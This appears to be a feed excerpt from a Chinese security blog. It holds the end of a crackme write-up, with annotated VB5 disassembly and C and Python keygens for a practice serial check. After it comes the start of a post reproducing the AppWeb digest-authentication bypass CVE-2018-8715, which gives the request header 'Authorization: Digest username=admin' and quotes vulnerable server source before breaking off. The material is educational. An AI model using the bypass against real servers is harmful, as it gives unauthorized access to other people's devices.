alt></p><p><strong>由于我们在跳转附近没有发现任何类注册码的东西，所以，我们需要将这里块的内容F8跟踪一下，大概地看看那些地方可能和注册码相关。我们向上查找，在这段程序的开头(即找到最近的那个retn,下面开头一般是push ebp等)下断点：</strong></p><p><strong>00402310  &gt; \55        push ebp // 程序段头</strong></p><p>单步F8跟踪，将重要信息添加注释，特别是和Name/Serial相关的东西，分析后代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">00402403   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">00402409   &gt;  8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]</span><br><span class="line">0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00402412   .  50            push eax                                       ;  &#x2F;&#x2F;eax&#x3D;111222,name</span><br><span class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]</span><br><span class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;]   ;  MSVBVM50.__vbaLenBstr</span><br><span class="line">0040241B   .  8BF8          mov edi,eax                                    ;  edi&#x3D;6</span><br><span class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]                ;  ecx&#x3D;1111222地址</span><br><span class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                           ;  &#x2F;&#x2F; 乘法,edi*0x17CFB</span><br><span class="line">00402426   .  51            push ecx</span><br><span class="line">00402427   .  0F80 91020000 jo 004026BE</span><br><span class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;]           ;  MSVBVM50.rtcAnsiValueBstr</span><br><span class="line">00402433   .  0FBFD0        movsx edx,ax</span><br><span class="line">00402436   .  03FA          add edi,edx                                    ;  &#x2F;&#x2F; edi&#x3D;edi+edx（0x31）</span><br><span class="line">00402438   .  0F80 80020000 jo 004026BE</span><br><span class="line">0040243E   .  57            push edi</span><br><span class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;]     ;  MSVBVM50.__vbaStrI4</span><br><span class="line">00402445   .  8BD0          mov edx,eax                                    ;  &#x2F;&#x2F; eax&#x3D;585235</span><br><span class="line">00402447   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">0040244A   .  FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;]   ;  MSVBVM50.__vbaStrMove</span><br><span class="line">00402450   .  8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0]</span><br><span class="line">00402456   .  50            push eax                                       ;  &#x2F;&#x2F; 585235</span><br><span class="line">00402457   .  57            push edi                                       ;  &#x2F;&#x2F; 0091B51C</span><br><span class="line">00402458   .  FF93 A4000000 call dword ptr ds:[ebx+0xA4]</span><br><span class="line">0040245E   .  85C0          test eax,eax                                   ;  &#x2F;&#x2F; &#x3D;&#x3D;0</span><br><span class="line">00402460   .  7D 12         jge short 00402474</span><br><span class="line">00402462   .  68 A4000000   push 0xA4</span><br><span class="line">00402467   .  68 5C1B4000   push 00401B5C</span><br><span class="line">0040246C   .  57            push edi</span><br><span class="line">0040246D   .  50            push eax</span><br><span class="line">0040246E   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">00402474   &gt;  8D45 E0       lea eax,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402477   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">0040247A   .  50            push eax</span><br><span class="line">0040247B   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">0040247E   .  51            push ecx</span><br><span class="line">0040247F   .  52            push edx</span><br><span class="line">00402480   .  6A 03         push 0x3</span><br><span class="line">00402482   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeStrList&gt;;  MSVBVM50.__vbaFreeStrList</span><br><span class="line">00402488   .  83C4 10       add esp,0x10</span><br><span class="line">0040248B   .  8D45 D4       lea eax,dword ptr ss:[ebp-0x2C]</span><br><span class="line">0040248E   .  8D4D D8       lea ecx,dword ptr ss:[ebp-0x28]</span><br><span class="line">00402491   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]</span><br><span class="line">00402494   .  50            push eax</span><br><span class="line">00402495   .  51            push ecx</span><br><span class="line">00402496   .  52            push edx</span><br><span class="line">00402497   .  6A 03         push 0x3</span><br><span class="line">00402499   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeObjList&gt;;  MSVBVM50.__vbaFreeObjList</span><br><span class="line">0040249F   .  8B06          mov eax,dword ptr ds:[esi]</span><br><span class="line">004024A1   .  83C4 10       add esp,0x10</span><br><span class="line">004024A4   .  56            push esi</span><br><span class="line">004024A5   .  FF90 04030000 call dword ptr ds:[eax+0x304]</span><br><span class="line">004024AB   .  8B1D 0C414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSet&gt;] ;  MSVBVM50.__vbaObjSet</span><br><span class="line">004024B1   .  50            push eax</span><br><span class="line">004024B2   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">004024B5   .  50            push eax</span><br><span class="line">004024B6   .  FFD3          call ebx                                       ;  &lt;&amp;MSVBVM50.__vbaObjSet&gt;</span><br><span class="line">004024B8   .  8BF8          mov edi,eax</span><br><span class="line">004024BA   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004024BD   .  52            push edx</span><br><span class="line">004024BE   .  57            push edi</span><br><span class="line">004024BF   .  8B0F          mov ecx,dword ptr ds:[edi]</span><br><span class="line">004024C1   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</span><br><span class="line">004024C7   .  85C0          test eax,eax                                   ;  eax&#x3D;0,zf&#x3D;1</span><br><span class="line">004024C9   .  7D 12         jge short 004024DD</span><br><span class="line">004024CB   .  68 A0000000   push 0xA0</span><br><span class="line">004024D0   .  68 5C1B4000   push 00401B5C</span><br><span class="line">004024D5   .  57            push edi</span><br><span class="line">004024D6   .  50            push eax</span><br><span class="line">004024D7   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">004024DD   &gt;  56            push esi</span><br><span class="line">004024DE   .  FF95 40FFFFFF call dword ptr ss:[ebp-0xC0]</span><br><span class="line">004024E4   .  50            push eax</span><br><span class="line">004024E5   .  8D45 D8       lea eax,dword ptr ss:[ebp-0x28]</span><br><span class="line">004024E8   .  50            push eax</span><br><span class="line">004024E9   .  FFD3          call ebx</span><br><span class="line">004024EB   .  8BF0          mov esi,eax</span><br><span class="line">004024ED   .  8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">004024F0   .  52            push edx</span><br><span class="line">004024F1   .  56            push esi</span><br><span class="line">004024F2   .  8B0E          mov ecx,dword ptr ds:[esi]</span><br><span class="line">004024F4   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</span><br><span class="line">004024FA   .  85C0          test eax,eax                                   ;  eax&#x3D;0</span><br><span class="line">004024FC   .  7D 12         jge short 00402510</span><br><span class="line">004024FE   .  68 A0000000   push 0xA0</span><br><span class="line">00402503   .  68 5C1B4000   push 00401B5C</span><br><span class="line">00402508   .  56            push esi</span><br><span class="line">00402509   .  50            push eax</span><br><span class="line">0040250A   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">00402510   &gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]                ;  eax&#x3D;3334444</span><br><span class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]                ;  ecx&#x3D;585235</span><br><span class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCat&gt;] ;  MSVBVM50.__vbaStrCat</span><br><span class="line">0040251C   .  50            push eax                                       ;  eax&#x3D;3334444</span><br><span class="line">0040251D   .  68 701B4000   push 00401B70                                  ;  UNICODE &quot;AKA-&quot;</span><br><span class="line">00402522   .  51            push ecx                                       ;  ecx&#x3D;585235</span><br><span class="line">00402523   .  FFD7          call edi                                       ;  &lt;&amp;MSVBVM50.__vbaStrCat&gt;</span><br><span class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;&gt;;  MSVBVM50.__vbaStrMove</span><br><span class="line">0040252B   .  8BD0          mov edx,eax                                    ;  edx&#x3D;eax&#x3D;AKA-585235</span><br><span class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402530   .  FFD3          call ebx                                       ;  &lt;&amp;MSVBVM50.__vbaStrMove&gt;</span><br><span class="line">00402532   .  50            push eax</span><br><span class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;]    ;  MSVBVM50.__vbaStrCmp</span><br><span class="line">00402539   .  8BF0          mov esi,eax                                    ;  eax&#x3D;-1</span><br><span class="line">0040253B   .  8D55 E0       lea edx,dword ptr ss:[ebp-0x20]</span><br><span class="line">0040253E   .  F7DE          neg esi                                        ;  取补</span><br><span class="line">00402540   .  8D45 E8       lea eax,dword ptr ss:[ebp-0x18]</span><br><span class="line">00402543   .  52            push edx</span><br><span class="line">00402544   .  1BF6          sbb esi,esi</span><br><span class="line">00402546   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00402549   .  50            push eax</span><br><span class="line">0040254A   .  46            inc esi</span><br><span class="line">0040254B   .  51            push ecx</span><br><span class="line">0040254C   .  6A 03         push 0x3</span><br><span class="line">0040254E   .  F7DE          neg esi</span><br><span class="line">00402550   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeStrList&gt;;  MSVBVM50.__vbaFreeStrList</span><br><span class="line">00402556   .  83C4 10       add esp,0x10</span><br><span class="line">00402559   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]</span><br><span class="line">0040255C   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">0040255F   .  52            push edx</span><br><span class="line">00402560   .  50            push eax</span><br><span class="line">00402561   .  6A 02         push 0x2</span><br><span class="line">00402563   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeObjList&gt;;  MSVBVM50.__vbaFreeObjList</span><br><span class="line">00402569   .  83C4 0C       add esp,0xC</span><br><span class="line">0040256C   .  B9 04000280   mov ecx,0x80020004</span><br><span class="line">00402571   .  B8 0A000000   mov eax,0xA</span><br><span class="line">00402576   .  894D 9C       mov dword ptr ss:[ebp-0x64],ecx</span><br><span class="line">00402579   .  66:85F6       test si,si                                     ;  esi&#x3D;0,ZF&#x3D;1</span><br><span class="line">0040257C   .  8945 94       mov dword ptr ss:[ebp-0x6C],eax</span><br><span class="line">0040257F   .  894D AC       mov dword ptr ss:[ebp-0x54],ecx</span><br><span class="line">00402582   .  8945 A4       mov dword ptr ss:[ebp-0x5C],eax</span><br><span class="line">00402585   .  894D BC       mov dword ptr ss:[ebp-0x44],ecx</span><br><span class="line">00402588   .  8945 B4       mov dword ptr ss:[ebp-0x4C],eax</span><br><span class="line">0040258B      74 58         je short 004025E5                              ;  &#x2F;&#x2F; 爆破关键跳，NOP</span><br><span class="line">0040258D   .  68 801B4000   push 00401B80                                  ;  UNICODE &quot;You Get It&quot;</span><br><span class="line">00402592   .  68 9C1B4000   push 00401B9C                                  ;  ASCII &quot;\r&quot;</span><br><span class="line">00402597   .  FFD7          call edi</span><br></pre></td></tr></table></figure><p>其实代码很简单，经过一遍跟踪，基本都出来了，重点分析部分如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00402412   .  50            push eax                                       ;  &#x2F;&#x2F;eax&#x3D;111222,name</span><br><span class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]</span><br><span class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;]   ;  MSVBVM50.__vbaLenBstr</span><br><span class="line">0040241B   .  8BF8          mov edi,eax                                    ;  edi&#x3D;6</span><br><span class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]                ;  ecx&#x3D;1111222地址</span><br><span class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                           ;  &#x2F;&#x2F; 乘法,edi*0x17CFB</span><br><span class="line">00402426   .  51            push ecx</span><br><span class="line">00402427   .  0F80 91020000 jo 004026BE</span><br><span class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;]           ;  MSVBVM50.rtcAnsiValueBstr</span><br><span class="line">00402433   .  0FBFD0        movsx edx,ax</span><br><span class="line">00402436   .  03FA          add edi,edx                                    ;  &#x2F;&#x2F; edi&#x3D;edi+edx（0x31）</span><br><span class="line">00402438   .  0F80 80020000 jo 004026BE</span><br><span class="line">0040243E   .  57            push edi</span><br><span class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;]     ;  MSVBVM50.__vbaStrI4</span><br><span class="line">00402445   .  8BD0          mov edx,eax                                    ;  &#x2F;&#x2F; eax&#x3D;585235</span><br></pre></td></tr></table></figure><p>首先，eax为Name的地址，经过<strong>vbaLenBstr计算的长度赋值给edi,然后edi=edi*0x17CFB,接着edi=edi+edx,而edx为Name字符串第一个字符Ansi的值，最后进过</strong>vbaStrI4将edi的整数值转换为十进制字符串585235。</p><p>然后向下跟踪和字符串585235相关的东西：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00402510   &gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]                ;  eax&#x3D;3334444</span><br><span class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]                ;  ecx&#x3D;585235</span><br><span class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCat&gt;] ;  MSVBVM50.__vbaStrCat</span><br><span class="line">0040251C   .  50            push eax                                       ;  eax&#x3D;3334444</span><br><span class="line">0040251D   .  68 701B4000   push 00401B70                                  ;  UNICODE &quot;AKA-&quot;</span><br><span class="line">00402522   .  51            push ecx                                       ;  ecx&#x3D;585235</span><br><span class="line">00402523   .  FFD7          call edi                                       ;  &lt;&amp;MSVBVM50.__vbaStrCat&gt;</span><br><span class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;&gt;;  MSVBVM50.__vbaStrMove</span><br><span class="line">0040252B   .  8BD0          mov edx,eax                                    ;  edx&#x3D;eax&#x3D;AKA-585235</span><br><span class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402530   .  FFD3          call ebx                                       ;  &lt;&amp;MSVBVM50.__vbaStrMove&gt;</span><br><span class="line">00402532   .  50            push eax</span><br><span class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;]    ;  MSVBVM50.__vbaStrCmp</span><br><span class="line">00402539   .  8BF0          mov esi,eax                    </span><br></pre></td></tr></table></figure><p>这段代码中将585235通过<strong>vbaStrCat与”AKA-”连接到一起组成字符串”AKA-585235”,然后通过</strong>vbaStrCmp函数与我们的Serial比较结果，最后返回值放到eax中，通过返回值确定是否正确。将这里的分析与上一块合到一起，很容易就可以得出最终的注册码。</p><blockquote><p>小结一下：先取出注册码的长度len, 然后取出注册码第一个字符的ANSI值cName, 让后计算len*0x17CFB+cName,将计算的值转换为10进制文本，前面加上”AKA-”组成最后的注册码。</p></blockquote><p>C/CPP代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CrackMe160.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">// 002</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;iostream&quot;</span></span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;160CrackMe-002 Name/Serial\r\n\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">    gets_s(buff,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">int</span> nLen = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">if</span> ( nLen &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> nRet = nLen * <span class="number">0x17CFB</span>;</span><br><span class="line">        nRet += buff[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AKA-%d\r\n&quot;</span>,nRet);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Input error!\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Python：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#  author ol4three</span><br><span class="line">i   &#x3D;   str(input())</span><br><span class="line">i_len &#x3D; len(str(i))</span><br><span class="line">print i_len</span><br><span class="line">i_len &#x3D; i_len * 0x17CFb</span><br><span class="line">flag &#x3D; ord(i[0]) + i_len</span><br><span class="line">print &quot;AKA-&quot; + str(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;首先打开进行查看&quot;&gt;&lt;a href=&quot;#首先打开进行查看&quot; class=&quot;headerlink&quot; title=&quot;首先打开进行查看&quot;&gt;&lt;/a&gt;首先打开进行查看&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyu
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="crackme" scheme="http://www.ol4three.com/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>AppWeb认证绕过漏洞(CVE-2018-8715)</title>
    <link href="http://www.ol4three.com/2020/12/22/WEB/Exploit/AppWeb/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2018-8715/"/>
    <id>http://www.ol4three.com/2020/12/22/WEB/Exploit/AppWeb/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2018-8715/</id>
    <published>2020-12-22T02:32:05.000Z</published>
    <updated>2020-12-23T08:51:00.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p></blockquote><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、basic 传统HTTP基础认证</span><br><span class="line"></span><br><span class="line">2、digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</span><br><span class="line"></span><br><span class="line">3、form 表单认证</span><br></pre></td></tr></table></figure><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接</p><p>认证成功，并返回session。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问页面如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222103500284.png" alt="image-20201222103500284"></p><p>构造的get数据包，加入我们构造的usename字段，注意用户名是已经存在的才可以进行构造</p><p>Authorization: Digest username=admin</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222104134406.png" alt="image-20201222104134406"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222104813555.png" alt="image-20201222104813555"></p><p>即可登陆成功</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参<br>数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><p>漏洞位置在<a href="https://github.com/embedthis/appweb/blob/v7.0.2/paks/http/dist/httpLib.c">appweb/paks/http/dist/httpLib.c 2</a></p><p>首先是<code>function authCondition()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    This condition is used to implement all user authentication for routes</span><br><span class="line"> *&#x2F;</span><br><span class="line">static int authCondition(HttpConn *conn, HttpRoute *route, HttpRouteOp *op)</span><br><span class="line">&#123;</span><br><span class="line">    HttpAuth    *auth;</span><br><span class="line">    cchar       *username, *password;</span><br><span class="line"></span><br><span class="line">    assert(conn);</span><br><span class="line">    assert(route);</span><br><span class="line"></span><br><span class="line">    auth &#x3D; route-&gt;auth;</span><br><span class="line">    if (!auth || !auth-&gt;type) &#123;</span><br><span class="line">        &#x2F;* Authentication not required *&#x2F;</span><br><span class="line">        return HTTP_ROUTE_OK;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!httpIsAuthenticated(conn)) &#123;</span><br><span class="line">        httpGetCredentials(conn, &amp;username, &amp;password);</span><br><span class="line">        if (!httpLogin(conn, username, password)) &#123;</span><br><span class="line">            if (!conn-&gt;tx-&gt;finalized) &#123;</span><br><span class="line">                if (auth &amp;&amp; auth-&gt;type) &#123;</span><br><span class="line">                    (auth-&gt;type-&gt;askLogin)(conn);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    httpError(conn, HTTP_CODE_UNAUTHORIZED, &quot;Access Denied, login required&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;* Request has been denied and a response generated. So OK to accept this route. *&#x2F;</span><br><span class="line">            &#125;</span><br><span class="line">            return HTTP_ROUTE_OK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!httpCanUser(conn, NULL)) &#123;</span><br><span class="line">        httpTrace(conn, &quot;auth.check&quot;, &quot;error&quot;, &quot;msg:&#39;Access denied, user is not authorized for access&#39;&quot;);</span><br><span class="line">        if (!conn-&gt;tx-&gt;finalized) &#123;</span><br><span class="line">            httpError(conn, HTTP_CODE_FORBIDDEN, &quot;Access denied. User is not authorized for access.&quot;);</span><br><span class="line">            &#x2F;* Request has been denied and a response generated. So OK to accept this route. *&#x2F;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* OK to accept route. This does not mean the request was authenticated - an error may have been already generated *&#x2F;</span><br><span class="line">    return HTTP_ROUTE_OK;</span><br><span 